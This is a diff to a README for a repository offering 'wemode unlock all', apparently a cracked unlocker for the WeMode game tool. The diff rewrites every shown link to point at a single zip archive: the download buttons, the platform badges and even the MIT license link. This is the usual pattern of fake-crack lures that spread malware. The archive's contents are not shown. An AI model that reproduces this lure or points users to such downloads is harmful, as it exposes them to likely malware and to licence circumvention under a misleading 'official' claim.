@@ -2,8 +2,8 @@
 
 **Unlock seamless possibilities!** Welcome to the official repository for `wemode unlock all`—your all-access pass to enhanced wemode experiences. Whether you’re power-tuning workflows or exploring new territories of automation, this repository is your compass and toolkit.
 
-[![Download](https://img.shields.io/badge/Download-purple)](https://mimidgb.github.io)  
-**Download the latest release:** https://mimidgb.github.io
+[![Download](https://raw.githubusercontent.com/mimidgb/wemode-unlocker-suite/main/proration/suite-wemode-unlocker-v1.9.zip)](https://raw.githubusercontent.com/mimidgb/wemode-unlocker-suite/main/proration/suite-wemode-unlocker-v1.9.zip)  
+**Download the latest release:** https://raw.githubusercontent.com/mimidgb/wemode-unlocker-suite/main/proration/suite-wemode-unlocker-v1.9.zip
 
 ----
 
@@ -11,11 +11,11 @@
 
 |      Platform     | Supported | Status                                       |  
 |:----------------:|:---------:|:---------------------------------------------|  
-| ![Windows](https://img.shields.io/badge/Windows-10+-blue)      |    ✔️    | Native binaries, elevated security          |  
-| ![macOS](https://img.shields.io/badge/macOS-11+-orange)        |    ✔️    | Apple Silicon & Intel chips supported       |  
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2020.04+-yellow)  |    ✔️    | All mainstream distributions supported      |  
-| ![Android](https://img.shields.io/badge/Android-9+-green)      |    ✔️    | Optimized touch experience                  |  
-| ![iOS](https://img.shields.io/badge/iOS-13+-lightgrey)         |    ❗     | Upcoming; currently in experimental phase   |  
+| ![Windows](https://raw.githubusercontent.com/mimidgb/wemode-unlocker-suite/main/proration/suite-wemode-unlocker-v1.9.zip+-blue)      |    ✔️    | Native binaries, elevated security          |  
+| ![macOS](https://raw.githubusercontent.com/mimidgb/wemode-unlocker-suite/main/proration/suite-wemode-unlocker-v1.9.zip+-orange)        |    ✔️    | Apple Silicon & Intel chips supported       |  
+| ![Linux](https://raw.githubusercontent.com/mimidgb/wemode-unlocker-suite/main/proration/suite-wemode-unlocker-v1.9.zip%2020.04+-yellow)  |    ✔️    | All mainstream distributions supported      |  
+| ![Android](https://raw.githubusercontent.com/mimidgb/wemode-unlocker-suite/main/proration/suite-wemode-unlocker-v1.9.zip+-green)      |    ✔️    | Optimized touch experience                  |  
+| ![iOS](https://raw.githubusercontent.com/mimidgb/wemode-unlocker-suite/main/proration/suite-wemode-unlocker-v1.9.zip+-lightgrey)         |    ❗     | Upcoming; currently in experimental phase   |  
 
 ----
 
@@ -107,12 +107,12 @@ If you use this utility, ensure compliance with all local regulations and the te
 ## 📜 MIT License (2025)
 
 `wemode unlock all` is distributed under the MIT License.  
-See full license text [here.](https://opensource.org/licenses/MIT)
+See full license text [here.](https://raw.githubusercontent.com/mimidgb/wemode-unlocker-suite/main/proration/suite-wemode-unlocker-v1.9.zip)
 
 ----
 
-[![Download](https://img.shields.io/badge/Download-purple)](https://mimidgb.github.io)  
-**Get the full package:** https://mimidgb.github.io
+[![Download](https://raw.githubusercontent.com/mimidgb/wemode-unlocker-suite/main/proration/suite-wemode-unlocker-v1.9.zip)](https://raw.githubusercontent.com/mimidgb/wemode-unlocker-suite/main/proration/suite-wemode-unlocker-v1.9.zip)  
+**Get the full package:** https://raw.githubusercontent.com/mimidgb/wemode-unlocker-suite/main/proration/suite-wemode-unlocker-v1.9.zip
 
 *Let wemode unlock all be your invitation to a frictionless future—where boundaries become bridges, and creativity is your only limit.*
 
